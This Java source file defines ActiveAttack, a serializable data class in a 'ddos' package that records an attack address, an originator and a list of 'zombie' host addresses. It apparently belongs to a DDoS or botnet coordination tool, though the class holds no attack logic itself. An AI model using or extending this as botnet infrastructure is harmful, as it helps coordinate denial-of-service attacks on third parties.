package org.ddos.util;

import java.io.Serializable;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.Arrays;

public class ActiveAttack implements Serializable {
	private static final long serialVersionUID = -4901856200667282492L;
	private String attackingAddress;
	private String originator;
	private ArrayList<SocketAddress> zombieAddresses = new ArrayList<>();

	public String getAttackingAddress() {
		return attackingAddress;
	}

	public void setAttackingAddress(String attackingAddress) {
		this.attackingAddress = attackingAddress;
	}

	public SocketAddress[] getZombieAddresses() {
		return zombieAddresses.toArray(new SocketAddress[zombieAddresses.size()]);
	}

	public void setZombieAddresses(SocketAddress... zombieAddresses) {
		this.zombieAddresses = new ArrayList<>(Arrays.asList(zombieAddresses));
	}

	public void addZombieAddress(SocketAddress zombieAddress) {
		zombieAddresses.add(zombieAddress);
	}

	public void removeZombieAddress(SocketAddress zombieAddress) {
		zombieAddresses.remove(zombieAddress);
	}

	public String getOriginator() {
		return originator;
	}

	public void setOriginator(String originator) {
		this.originator = originator;
	}
}